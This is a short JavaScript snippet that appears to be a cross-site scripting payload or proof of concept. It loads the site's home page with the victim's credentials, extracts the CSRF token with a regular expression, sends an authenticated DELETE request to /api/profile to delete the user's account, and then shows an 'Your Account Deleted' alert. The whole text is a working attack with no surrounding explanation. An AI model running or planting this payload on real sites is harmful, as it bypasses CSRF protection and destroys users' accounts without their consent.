var x = new XMLHttpRequest();
x.open('GET', '/');
x.withCredentials = true;
x.onload = function() {
  var csrf = x.responseText.match(/window\.csrfToken\s*=\s*["']([^"']+)["']/)[1];
  var d = new XMLHttpRequest();
  d.open('DELETE', '/api/profile');
  d.withCredentials = true;
  d.setRequestHeader('X-Csrf-Token', csrf);
  d.onload = function() { alert('Your Account Deleted'); };
  d.send();
};
x.send();
